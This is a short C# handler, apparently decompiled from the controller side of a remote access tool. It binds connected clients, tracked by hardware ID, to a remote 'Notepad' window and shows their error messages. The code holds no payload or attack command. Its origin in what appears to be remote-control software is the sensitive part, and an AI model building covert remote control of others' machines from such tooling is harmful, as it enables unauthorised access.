using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;

namespace Server.Messages;

internal class HandlerNotepad
{
	public static void Read(Clients client, object[] objects)
	{
		if (client == null || objects == null || objects.Length < 2)
		{
			if (client != null)
			{
				client.Disconnect();
			}
			return;
		}
		string a = (string)objects[1];
		if (!(a == "Connect"))
		{
			if (!(a == "Error"))
			{
				return;
			}
			if (client.Tag == null)
			{
				client.Disconnect();
				return;
			}
			FormNotepad form = (FormNotepad)client.Tag;
			form.Invoke((MethodInvoker)delegate
			{
				RichTextBox richTextBox = form.richTextBox1;
				richTextBox.Text = richTextBox.Text + "Error: " + (string)objects[2] + "\n";
			});
			return;
		}
		FormNotepad form2 = (FormNotepad)Application.OpenForms["Notepad:" + (string)objects[2]];
		if (form2 == null)
		{
			client.Disconnect();
			return;
		}
		form2.Invoke((MethodInvoker)delegate
		{
			form2.Text = "Notepad [" + (string)objects[2] + "]";
			form2.client = client;
			form2.richTextBox1.Enabled = true;
		});
		client.Tag = form2;
		client.Hwid = (string)objects[2];
	}
}
